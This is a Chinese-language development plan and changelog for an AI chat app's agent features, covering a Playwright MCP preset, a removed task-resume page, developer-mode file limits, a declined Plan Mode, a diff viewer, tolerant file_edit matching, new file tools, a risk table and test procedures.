**落地紀錄（2026-11-10）**：`lib/core/services/mcp/playwright_mcp_preset.dart`（純函數、可測）——`PlaywrightMcpPreset.launchSpec`（`npx -y @playwright/mcp@latest`；Windows 因 `npx` 是 `.cmd` shim 無法被 `Process.start` 直接 spawn，自動包 `cmd /c`）、`McpStdioDiagnostics.describeConnectError`（ProcessException→Node.js 20+ 提示、timeout（含字串型）→首次下載＋調高 request timeout 提示、startup exit/handshake 失敗→終端機自查提示、未知透傳）、`parseStdioArgs`（空白分隔＋雙引號 span）。`McpProvider.connect` 對 STDIO 錯誤改用分類訊息。伺服器編輯 sheet：傳輸選擇器新增 STDIO（僅桌面顯示；mobile 端 provider 仍拒絕 STDIO 連線作 defense in depth）、命令／參數／工作目錄／環境變數欄位（與 headers 共用新抽出的 `_kvEditor`）、新增面板頂部一鍵 Playwright 預設（l10n ×4 新增兩鍵，原 `mcpServerEditSheetStdio*` 鍵直接啟用）；MCP 清單與助理選單傳輸標籤修正（stdio 原誤示 HTTP）。截圖通路：`McpToolService.callToolDetailedForAssistant`（text＋base64 images；`callToolTextForAssistant` 改薄委託，簽名不變）→ `McpScreenshotStore.save`（`<app cache>/mcp_screenshots/`、40 張 prune、**不進工作區**——零殘留裁定）→ tool handler MCP 段落盤＋`[image:<abs-path>]` marker＋extras `imagePath`（`_persistViewImageExtras` 改名 `_persistImagePreviewExtras` 與 file_view_image 共用；`kPreservedToolEventExtraKeys` 既有）；URL 型圖片維持舊 marker。工具輸出上限沿用既有 `ToolResultCaps.cap`（MCP 段已接）。測試：`test/playwright_mcp_preset_test.dart`（11）、`test/mcp_screenshot_store_test.dart`（6，PathProviderPlatform fake）、`test/tool_handler_mcp_failure_test.dart` doubles 改 override detailed 方法＋新增圖片端到端（落盤／marker／文字保留）——合計 22 案全綠，相鄰 MCP／caps／dev-mode 測試 32 案回歸通過。**呈現差異**：無——三能力（截圖／console／點擊）皆由 Playwright MCP 原生工具承擔，app 側只做預設、錯誤分類與截圖呈現；截圖對模型仍是文字 marker（vision plumbing 屬 `file_view_image` Stage 2，未做）。

---

### 2.12 P3-3 跨會話任務恢復（「進行中任務」頁）⛔【2026-11-09 裁示移除（UI 面）】

**裁示（2026-11-09）**：UI 面全數移除。橫幅屬**推播式**恢復——實測造成打擾；任務頁（2026-11-08 落地於側欄、後遷設定頁）屬**拉取式**恢復——無實際使用，且價值與對話內就地發現高度重疊（pending 卡只差導航、Running 列僅能 Open、bare 中斷由部分訊息＋regenerate 後備覆蓋）。判準：要「遺忘的中斷任務」造成實損，需「多步 run＋程序被殺＋長期不回該對話＋任務重要」四條件同時成立，且後果僅是需重新提示、**無資料損失**（對話與 tool events 完整持久化）。移除範圍：`AgentTasksView`／`AgentTasksPage`／`showAgentTasksDesktopDialog`／`AgentRunTaskService`／`AgentRunTask`／`HomePageController.resumeAgentRun`／`maybeCurrent` 橋接與 27 個 l10n keys；**保留** P2-1 寫入地基與 `ChatActions.resumeRun` facade（派發契約由 `approval_lifecycle_test` 鎖定）。未來 P2-2 背景任務若需收件匣，`agent_runs_v1` 讀取面仍在，重建 UI 成本低。

**以下原規劃與落地紀錄保留供追溯（UI 面已於 2026-11-09 移除）**：

**目標**：以 P2-1 的 `agent_runs_v1` 為資料源，做全域「**進行中任務**」頁——列出所有對話中未完成的 agent run（跨對話、跨日期），點入即 resume。把恢復能力從「崩潰保險」（啟動橫幅只覆蓋單點）升級為**可發現的任務管理面**；也是 P2-2 背景任務的自然收件匣。

**落地紀錄（2026-11-08）**：`AgentRunCheckpointStore.listAll()`（newest-first、沿用 corrupt row sweep）；`AgentRunTask`／`AgentRunTaskReason` 把 `phase`＋`pendingTools` 投影為 approval／ask_user／interrupted／running／soft-stop；`AgentRunTaskService` 讀時聚合、刪除對話已不存在的 stale checkpoint（lookup 失敗視為 unknown，保留任務）；`AgentTasksView` 提供載入／空狀態／列（對話名、原因、pending tool、step、最後儲存時間），`AgentTasksPage`（行動）與 `showAgentTasksDesktopDialog`（桌面）共用同一視圖。側欄底部新增 `ListChecks` 入口：桌面開 dialog、行動推頁。`HomePageController.resumeAgentRun(checkpoint)` 承接任意列（pending 卡只導航回時間軸、bare run 走既有 `ChatActions.resumeRun`），啟動橫幅改為其薄包裝。無新增持久化、無 schema 變更。l10n ×4。測試：`test/agent_checkpoint/agent_run_task_test.dart`（reason 映射／排序／跨對話聚合／stale 清理／lookup 失敗保留／空 journal）與 `agent_tasks_view_test.dart`（空狀態／列渲染／點擊回呼）；四檔合計 30 案全綠。**呈現差異**：桌面入口沿用既有 chat-history dialog 慣例（計畫原稱 popover），與行動頁共用同一 `AgentTasksView`。

**後續修正（2026-11-08）**：任務列以 `loadingConversationIds` 區分執行中任務，顯示 Running／Open，點擊只導航到該對話，不重複啟動請求；stale／載入失敗不再靜默關閉，清單保留並顯示錯誤與重試。`ChatService.getConversation` 在未初始化時視為 unknown，不再誤刪 checkpoint；pending tool 依 reason 優先顯示 ask_user。

**實作內容**：清單頁（桌面 popover + 行動頁，比照 Workspace Tools 的雙入口慣例）——每列顯示對話名/任務起點/中斷原因（approval pending / crashed / soft-stop）；點入 → 導航對話 → `resumeRun`；run 完成/取消後移除。

**嚴格依賴 P2-1**——沒有 `agent_runs_v1` 就無清單可列。成本最低（純 UI + 查詢既有 box）。

**測試**：清單查詢（多對話聚合、排序）、點入 resume 全鏈、run 終態後從清單消失、空狀態。

---

### 2.13 P3-4 上限再校準 + 磁碟預算 ✅【2026-11-08 完成】

**目標**：讓開發者模式**名實相符**——現行上限是為「一般使用者的沙盒」設計的（實測常數：`maxWriteBytes = 512KB`、`maxReadBytes = 24KB`、單次工具回傳 32,768 字元），真實 coding 場景（資料檔、設計資產、大型 JSON fixtures）會不斷撞牆。

**實作內容**：
1. **開發者模式下寫入上限 512KB → 2MB 級**（`FileToolService` 常數改為 dev-mode 條件式；**預設沙盒的 512KB hard floor 不變**——保護一般使用者，ADR-A8 教義「hard floor 不隨審批放寬」同源）。
2. **磁碟預算顯示**：工作區佔用可視化（Workspace Tools 頁/設定）——放寬上限後的配套責任（零殘留政策的誠信配套）。
3. **`file_read` 分頁體驗優化**：24KB 窗口 + offset/limit 的翻頁效率（檔案變大後成為模型讀大檔的實際瓶頸）。

**落地紀錄（2026-11-08）**：
- `FileToolService.execute(..., developerMode: ...)` 由 `ToolHandlerService` 注入 `SettingsProvider.developerModeV1`；預設仍為 `maxWriteBytes = 512KB`，dev mode 使用 `developerMaxWriteBytes = 2MB`。`file_write`／`file_append`／`file_edit`／`file_patch`／`file_create_pdf` 與其錯誤訊息同步採用實際上限；審批不會改變上限（ADR-A8）。
- `WorkspaceDiskUsageService.measure()` 非同步掃描工作區（不跟隨連結、排除根目錄 `.omnichat/`、上限 50,000 項目並回報 `truncated`）；`WorkspaceDiskUsageCard` 顯示總量／檔案數／partial 狀態與重新整理，掛在 `WorkspaceToolsPage` 頂部；桌面 popover 與行動 sheet 將目前 workspace path 傳入 Tools 頁。dev mode 開啟時 Tools 頁另顯示 2MB 提示。
- `file_read` 預設窗口由 16KB 提高為 24KB（等於既有上限），維持單次結果低於 32,768 字元；`offset`／`limit`／`next_offset`／`has_more` 契約不變。
- l10n ×4 新增 disk usage 與 dev-mode 寫入上限提示。
- 測試：`test/file_tool_developer_limits_test.dart`（預設 512KB、dev 600KB 成功、2MB 上限、append 邊界）、`test/workspace_disk_usage_test.dart`（總量／`.omnichat/` 排除／截斷／格式化）；既有 `file_read` 邊界測試維持通過。
- 後續修正（2026-11-08）：partial 訊息改用 `scannedEntryCount`（實際掃描 entry 數，不再借用 `fileCount`）；`formatWorkspaceBytes` 修正 1023.95KB 顯示 1024KB 的進位邊界；新增 `ToolHandlerService` developer-mode 接線、24KB 預設窗口與磁碟卡 widget 測試。

**依賴 P1-6**——本質是 dev mode 的參數校正，P1-6 落地後才有意義。

**測試**：dev mode 開/關的上限行為（關閉時回 512KB）、磁碟預算計算（含 `.omnichat/` 排除）、分頁邊界。

---

### 2.14 P3-5 Plan Mode ❌【2026-11-08 裁示不實作】

**裁示**：不實作。截至 2026 年，模型能力已大幅提升，能穩定自行「先規劃再動手」；獨立的 plan mode 帶來額外的模式狀態、批准中斷與恢復成本，收益已低於流程摩擦，主流 coding harness 也已陸續移除 plan mode。需要先看計畫時，既有 `write_todos` 計畫卡＋一般對話確認已足夠，不再新增一套模式切換與工具閘門。

**原規劃（保留供追溯，不再執行）**：先規劃（模型產出計畫）→ 人批 → 再執行的模式切換；輸入列模式切換、Plan 模式下停用副作用工具、批准後計畫轉 todo 並切回執行模式、拒絕後修訂計畫。

**未落地**：裁示前僅鋪底、未接線；鋪底的 `plan_mode.dart`、`SettingsProvider.planModeEnabled` 與 system prompt 注入均已還原，未產生持久化鍵值或 UI 變更。

---

### 2.15 P1-1(尾) 執行後全檔 diff viewer ✅【2026-11-08 完成】

**落地紀錄（2026-11-08）**：新增 `lib/core/services/file/unified_diff.dart`——`diffutil_dart` 5.0.0 的 Myers 核心 + update replay 還原行序，輸出標準 hunks（context 3、`--- a/…`/`+++ b/…`）、`addedLines`/`removedLines` 全量計數與 64KB 尾端截斷（`... (N more lines)`；極端上限只留 header）。`FileToolResult.diff` 於 write/append/edit/patch/delete 前後擷取（>256KB 或二進位靜默跳過，不影響工具結果）；`ToolHandlerService` 在結果 upsert 前把 `diffText`/`diffAdded`/`diffRemoved`/`diffTruncated` 寫入 tool event extras（列入 preserved keys）。時間軸 summary 只載入 `json_extract($.diffAdded/diffRemoved)`，工具卡標題顯示 `+N/−N`；展開時 `loadToolEventDetail` 取 `diffText`，桌面 dialog／行動 sheet 以唯讀等寬區塊顯示（`chatMessageWidgetDiff`，l10n ×4）。審批卡預覽依裁定仍用 `buildEditPreviewDiff`，未換芯、不共用來源。測試：`unified_diff_test`（15）、`file_tool_diff_test`（9）、`tool_handler_diff_extras_test`（1）、codec summary（2）全綠；既有 `file_tool_service_test`（67）與 dev-mode handler 測試亦全綠；`flutter analyze --no-pub` 0 errors。

P1-1 落地時 `file_edit` 已有**預覽 diff**（`buildEditPreviewDiff`：確定性行級 old/new 塊、**無 LCS**——多處修改時不可讀）；**執行後全檔 diff** 留待本項——工具卡展開顯示執行後的完整變更。

**kelivo 導入（§0.5）——以 Myers unified diff 為 diff 來源**：

- 新 `unified_diff` 服務（藍圖：kelivo `unified_diff.dart`，~215 行）：`diffutil_dart`（Myers）產生標準 hunks、context 3 行、`--- a/…`/`+++ b/…` header、**added/removed 計數**、64KB 上限 + `... (N more lines)` 截斷標記。**截斷語意**：hunks 由**尾端**逐個丟棄至符合上限；`±N` 計數為**截斷前全量**（實作時勿用顯示行數回推）。
- 渲染：**執行後 viewer 一律用 Myers 輸出**；工具卡標題顯示 `+N/−N` 計數（kelivo `WorkspaceAddedRemovedCounts` 模式）。
- **審批卡預覽（二選一，本版裁定）**：保留現行 `buildEditPreviewDiff`（基於請求參數的近似預覽——與 P1-8 容忍匹配的差異見 §2.16），換芯為 Myers 列為同批可選；**若未換芯，審批卡與 viewer 不共用 diff 來源**（消除原「共用」與「保留快速路徑」的矛盾）。換芯時 P1-1 既有 25 案 diff 測試需同步改寫期望值。

**依賴**：tool event 已落地的新舊內容（`tool_events_v1` 既有記錄）；`diffutil_dart` 為新依賴（pubspec 目前無 diff 套件），需評估維護狀態。

---

### 2.16 P1-8（新）file_edit 三段式容忍匹配 ✅【2026-11-06 完成】

> **藍圖**：kelivo `edit_matchers.dart`（~276 行，自述移植自 RikkaHub `TextReplacers.kt`）。2026-11-06 kelivo workspace 調查的最高優先導入（§0.5 A）。
>
> **落地紀錄（2026-11-06）**：新增 `lib/core/services/file/edit_matchers.dart`（純 Dart 策略階梯：`exact` → `line_trimmed` → `block_anchor`、縮排重對齊、CRLF 正規化、非重疊視窗）；`file_tool_service.dart` 的 `_edit` 改接（移除 `_countOccurrences`），成功訊息附 `[matcher: …]`、ambiguous 附策略名、not-found 附「重新 `file_read` 後逐字複製」指引；工具定義改述容忍匹配。測試：`test/edit_matchers_test.dart`（策略階梯）＋`test/file_edit_tolerant_service_test.dart`（工具契約）。`preview_diff` 依原裁定維持由請求參數生成（已知近似，未升級）。

**目標**：大幅降低 `file_edit` 失敗率——模型提供的 `old_text` 帶輕微縮排／行尾差異時不再整個失敗。

**現況**（已核對）：`file_tool_service.dart` `_handleEdit` 為**純精確匹配**——`_countOccurrences` 找不到即回錯「The old_text was not found」；`replace_all` 已支援。

**現況補充**（已核對）：既有測試在 `test/file_tool_service_test.dart`（1,413 行，含 ambiguous「matched 2 times」與 `replace_all` 案例）。

**實作內容**：

1. 匹配策略降級鏈（逐策略依序；**第一個有命中的策略決定**）：
   - **`exact`**：原文 `indexOf` 掃描（現行為）；精確匹配成功時零行為變化。
   - **`line_trimmed`**：`minLines=1`、要求 oldText **非全空白**；逐行 `trim()` 後做等長視窗比對；命中後以**整窗替換**（非重疊視窗掃描）。
   - **`block_anchor`**：`minLines≥3`、**首尾行須非空**；**只比對首尾行（中段完全不比對）**、命中即以**整窗替換**。
   - **縮排重對齊（兩策略共用）**：以 oldText 首行縮排 vs 實際命中窗首行縮排，對 newText 做 `_reindent`（空行不動、僅處理以 oldIndent 開頭的行）——這是「套用時保留原檔縮排」的實作，`line_trimmed` 與 `block_anchor` 同享。
2. 多重匹配：非 `replace_all` 時回 `ambiguous` 錯誤，**附命中數與命中的策略名**（比照現行訊息格式加 strategy 標示）——指導模型加上下文或改用 `replace_all`。**成功結果亦回傳所用策略**（模型可自省本次是否走了容忍匹配）。
3. 全部找不到時，錯誤訊息指導「重新 `file_read` 後逐字複製 old_string」（kelivo `kEditNotFoundMessage` 語意）。
4. 工具介面（`old_text`/`new_text`/`replace_all`）、hard floor（容量上限、黑名單）完全不動。
5. **審批卡 `preview_diff` 維持現行邏輯（本版修正）**：`tool_handler_service.dart` 以 `buildEditPreviewDiff(args)` **直接由請求參數生成**——不是最終匹配結果。容忍匹配下，預覽可能與實際替換有縮排／中段差異（`block_anchor` 中段盲區尤甚）；列為**已知近似**，不在本項升級（可選升級＝分類時讀檔解析實際 match，但審批分類目前刻意不讀檔，成本較高、另案評估）。

**⚠️ block_anchor 的資料風險（必須寫進實作與測試）**：中段不比對＋整窗替換 ⇒ 若模型 `old_text` 中段與檔案實際中段有漂移，該段會被 `new_text` **靜默覆蓋**（kelivo/RikkaHub 接受此取捨）。緩解：成功訊息回傳策略、ambiguous 指導、文件註明語意；測試必含「中段漂移」案例以鎖定此行為。

**測試**：三策略各自命中/未命中、降級順序（exact 成功不得進入 fallback）、ambiguous（含策略標示）、`replace_all` 跨策略與非重疊視窗、`block_anchor` 中段漂移（整窗覆蓋語意）、縮排差異／CRLF／UTF-8 邊界、空白 oldText 拒絕、容量上限照常適用。

**風險**：低——fallback 僅在精確失敗時觸發、語意保守；`line_trimmed` 命中多處時行為與 exact ambiguous 一致；唯一需接受的是 block_anchor 中段盲區（已列測試鎖定與訊息提示）。

**版本**：v1.29.x 即可（與 P0-3 尾款/P1-6 同批或更早）；不依賴任何其他項目。

---

### 2.17 （可選）kelivo 週邊導入項 🔶（view_image Stage 1 與 file_grep 已實作 2026-11-09）

- **✅ `file_grep` 內容搜尋（2026-11-09 實作，補 §0.5 裁定的唯一真缺口）**：第 16 個 `file_*` 工具。regex 逐行搜尋檔案內容，回傳 `path:line: text`（單行截斷 240 字元）；無效 regex 自動退回 literal 並註記；`ignore_case`／`limit`（預設 100、上限 1000）參數；跳過 >2MB、二進位（前 8KB NUL probe）、symlink、dot 目錄（`.git` 等；顯式指定隱藏資料夾仍可搜）；支援單檔目標與 session-outputs 唯讀區；自動繼承 workspace 閘門／per-tool toggle／出界審批／`ToolResultCaps`；compactor `_inspectTools` 與摘要已接線。測試：`test/file_grep_view_image_test.dart`。
- **🔶 `file_view_image` 工作區圖片檢視（kelivo `view_image` 模式）——Stage 1 已實作（2026-11-09）**：第 17 個 `file_*` 工具。PNG/JPEG/GIF/WebP/BMP magic-byte 驗證（上限 10MB），回傳 `[image:<abs-path>]` marker（模型端純文字）＋ tool-event extras `imagePath`（UI-only，入 `kPreservedToolEventExtraKeys`／`ToolPartSummary`／SQLite metadata 查詢）；工具卡渲染縮圖、詳細視窗／底部 sheet 渲染大圖預覽（`_buildToolImagePreview`／`_ToolImageThumb`，載入失敗靜默降級）；支援 session-outputs 唯讀區。**Stage 2 待做**：vision plumbing——按 transport 把 marker 升級為原生 vision part（Claude `tool_result` image block、chat-completions 內容陣列、Gemini 降級）＋ vision 能力偵測（catalog `modalities.input`）＋不支援模型回明確錯誤；另立細部執行計畫。原藍圖「讀圖轉 message part（vision 能力偵測；不支援的模型回明確錯誤）」即 Stage 2 範圍；出界照 §3.1 審批語意（已繼承 `file_*` 閘門）。
- **檔案連結協定（kelivo `kelivo://` 模式）**：模型在回文中以 `omnichat://workspace/<path>` 引用檔案 → App 渲染可點擊 chip（比照既有 `[image:]/[file:]` marker 慣例），點開即預覽。藍圖：kelivo `file_link_resolver.dart`（8 種連結 kind、percent-encode 規則模型提示共用）。落點：隨 P2-4 預覽面板批次。
- **附件進沙盒 session 目錄（kelivo `workspace_session_sync.dart` 模式）**：把 user 訊息附件複製到 per-conversation session dir（app 私有），file 工具即可讀取附件——補足「附件只進 inline 圖片、file 工具讀不到」的缺口；寫入序列化、刪除時同步清理。
- **行動 in-app terminal（kelivo `terminal_view` + PTY + OSC 1337 + wakelock）**：**依賴 P2-5**（需要沙盒 PTY；桌面走系統終端機路線，見 §2.2 增量 6）。

---

## 3. 全域風險與注意（沿用原計畫 §7，篩選適用剩餘項目）

| 風險 | 緩解 |
|:--|:--|
| **Reasoning echo 回歸**（P0-3 移除舊路徑時的最大風險）：中立格式 follow-up 若丟失 `reasoning_content`/`reasoning_details`/Gemini thought sig，DeepSeek/Kimi/OpenRouter 多輪工具會降智或報錯 | kernel `assistantExtras` 已貫通 + body 逐位元組對照測試鎖死（kelivo `0f44150` 為前車之鑑）；移除舊迴圈時 parity 測試必跑 |
| **壓縮 × prompt cache 互咬** | marker 凍結切點 + 成批壓縮 + 注入位置穩定；P2-6(L3) 檔案地圖以 mtime 為失效鍵，未變則逐字相同；cache_expiry 已落地（2026-11-06），僅在最後成功 usage 閒置 ≥30 分鐘時觸發 |
| **兩把 token 尺**（預算 `chars/3` vs 閾值 usage 實測） | 觸發一律以 usage 實測為準；chars 估算僅作內部預算 |
| **Windows 穩定性**（P1-6/P2-5）：pipe deadlock、孤兒子程序樹、cp950 亂碼 | shell 串行、collectors-first drain、Job Object tree-kill、環境 allowlist、secret 遮蔽；手冊 §5.1「外部程序治理」子節隨落地補上 |
| **同步分類（§5.7）** | `developer_mode_v1`、shell allowlist、審批政策 = 全域偏好（同步）；`agent_runs_v1` = 裝置本地（**與附B 矛盾處隨 P2-1 裁定**，見 §2.4） |
| **Dart `async*`**：`yield*` 於 try/catch 的例外穿透限制 | kernel/driver/新服務一律 `await for` + `yield`（§3.10 守則） |
| **voice/AI Team 路徑** | 主線不動 + 回歸測試（`chat_turn_service_test`、AI Team smoke）；P2-3 子代理沿用串行先例 |
| **舊路徑雙軌期**（P0-3） | kill-switch + 一個 soak 版本後移除；雙軌期內不對舊迴圈加任何新功能 |
| **ToolRun 串流記憶體**（P1-6 kelivo 導入）：即時輸出是新的常駐風險源 | bounded tail（200 行/32KB）+ LRU（200 條/8MB）+ `finishHandoff`；shell payload 加料從自身預算扣除（F1 教訓）；外部化落 app 私有 `tool_outputs/`（唯讀 zone＋retention 20 檔/7 天），工作區零殘留不變 |

---

## 4. 驗證策略（各項收尾必跑）

```bash
flutter gen-l10n                # 有新增 l10n key 時
flutter analyze --no-pub        # 0 errors（既有 warnings/info 不增量）
flutter test                    # 新增測試 + 既有回歸（700+ 案全綠）
```

- 各項出貨前：Windows（含 ARM64）+ Android 手動 smoke；涉 MSIX 變更跑 `tool/run_wack.ps1`。
- 每項慣例：kill-switch prefs key（`*_v1`）、l10n 四語系（en/zh/zh_Hans/zh_Hant）、審批/l10n 鍵先查 `app_en.arb` 既有命名、手冊同步更新（見 §5）。

---

## 5. 手冊同步清單（原計畫附B 篩選適用剩餘項目）

| 手冊位置 | 動作 | 時機 |
|:--|:--|:--|
| §3.8 資料持久化/Backup | backup 版本隨新持久化區段升版並保持向後相容——`agent_runs_v1`（P2-1）、shell tool events（P1-6）；restore 不自動 replay shell command | P1-6 / P2-1 |
| §4 ADR 表 | ADR-A7（checkpoint 翻案）、ADR-A8/A9（shell 政策）已在計畫 §2 定義，隨落地核對 | P1-6 / P2-1 |
| §5.1 Windows 穩定性 | 新增子節「外部程序治理」（`Process.start` + collectors 先於 wait、超 cap 持續 drain、Job Object tree-kill、環境 allowlist、cp950/`chcp 65001`、secret 遮蔽） | P1-6 |
| §3.1 工作區沙盒檔案系統 | 措辭更新：「預設沙盒；沙盒外寫入需逐次明示核准；黑名單與容量上限不隨核准放寬」；新增唯讀 session-outputs zone（`file_read`/`file_search` 可進、寫入拒）＋ retention（20 檔/7 天） | P1-6 |
| §5.7 `_localOnlyKeys` | 新鍵值歸類審查（`developer_mode_v1`/allowlist 同步；`agent_runs_v1` 本地） | P1-6 / P2-1 |
| §3.14 Agent Runtime | checkpoint、背景任務、子代理各小節隨落地補記 | P2-1 起 |
| §7 現狀與待辦 | 各項完成後更新 roadmap（並標記本計畫為 Cowork 剩餘項目的權威清單） | 每版本 |
| §3.1 檔案工具 | `file_edit` 匹配策略（三段降級、ambiguous 策略標示）隨落地補記 | P1-8 |

---

## 6. 原計畫參考實作對照（剩餘項目適用部分）

| 參考 | 用於 |
|:--|:--|
| **AnyBuff**（本機 `C:\Users\w2bn1\GitHub\Anybuff`） | P1-2 尾款 cache_expiry（`compact-history.ts` 自帶觸發器）、P2-3 子代理（`agents/` template）、P2-6 L3（`truncate-file-tree` 概念）、**P2-5 Android proot 沙盒**（`android/` engine——ProotRunner bind 全景＋`/proc` 偽造＋孤兒清掃、DirectAccess §4.6 AFA direct-bind registry＋可移除卷映射＋copy flow fallback、RootfsInstaller/SafeTarExtractor——細節見 §2.8 對照實作段；同譜系抄設計不抄碼） |
| **deepseek-harness**（github.com/deepseek-ai/deepseek-harness） | P2-1 checkpoint（`session-checkpoint-policy` + `SessionWriteBehind`）；P3-5 Plan Mode（`plan/plan-mode`）已裁示不實作 |
| **kelivo**（`/tmp/kelivo-upstream`；**workspace 調查基準**：`/tmp/kelivo-ws-survey` @ `51777f7`，workspace 為 v1.3.0+） | P0-3（providers 分層對照）、P2-7 資料模型與 trace 回放；**workspace（AGPL-3.0，同譜系 fork 慣例已存在）**：P1-8 `edit_matchers`、P1-6 增量（ToolRun／shell payload／`output_buffer.dart` offloader＋retention／環境旗標／`timeout_seconds`）、§2.15 `unified_diff`、P2-5 `sandbox/` 對照、§2.17 `file_link_resolver`／`workspace_session_sync`／`view_image`——native/channel 層抄設計不抄碼 |
| **RikkaHub**（`/tmp/rikkahub`） | P2-5 Proot（`workspace/` 模組）、P1-1 尾款 diff（`WorkspaceToolUIs.diffOf`）——Kotlin，抄決策與語意，不抄代碼 |
| **CLI 工具整合計畫 v4**（已吸收進本計畫：P2-5 藍圖＋F-Droid 條款→§2.8 內化藍圖；§五/§六執行契約、§十三測試矩陣→§2.2。原文 2026-11-06 起封存於 D:\Softwares\Omnichat\Archive） | 自計畫 v1.3 起**不需回查**（僅歷史歸屬） |
